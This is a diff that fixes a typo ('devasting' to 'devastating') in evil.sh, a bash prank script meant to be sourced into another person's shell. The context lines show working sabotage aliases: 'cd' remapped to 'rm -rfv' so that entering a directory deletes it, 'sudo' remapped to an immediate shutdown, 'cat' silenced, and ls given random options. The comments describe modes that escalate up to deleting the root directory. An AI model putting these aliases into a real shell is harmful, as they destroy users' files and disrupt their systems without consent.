@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 # evil.sh — https://mths.be/evil.sh
 
-# valid values are: insane, annoying, destructive, devasting, unusable
+# valid values are: insane, annoying, destructive, devastating, unusable
 # each mode of operation includes the previous one's tweaks
 #
 # insane: only enable subtle behaviour that confuses and slowly drives people insane e.g. make exit
@@ -9,7 +9,7 @@
 # annoying: like insane just way more obvious behaviour allowed (e.g. constantly cd to the wrong
 #   (random) directory
 # destructive: delete files and do serious harm, non-recoverable damage included
-# devasting: may delete /
+# devastating: may delete /
 # unusable: enable everything including, but not limited to replacing enter by backspace
 EVIL_BEHAVIOUR=annoying
 
@@ -25,12 +25,12 @@ function annoying()
 
 function destructive()
 {
-	devasting || test "$EVIL_BEHAVIOUR" = "destructive"
+	devastating || test "$EVIL_BEHAVIOUR" = "destructive"
 }
 
-function devasting()
+function devastating()
 {
-	unusable || test "$EVIL_BEHAVIOUR" = "devasting"
+	unusable || test "$EVIL_BEHAVIOUR" = "devastating"
 }
 
 function unusable()
@@ -57,7 +57,7 @@ annoying && alias cat=true;
 annoying && function ls { command ls -$(opts="frStu"; echo ${opts:$((RANDOM % ${#opts})):1}) "$@"; }
 
 # Delete directories instead of entering them.
-devasting && alias cd='rm -rfv';
+devastating && alias cd='rm -rfv';
 
 # Shut down the computer instead of running a command with super-user rights.
 destructive && alias sudo='sudo shutdown -P now';
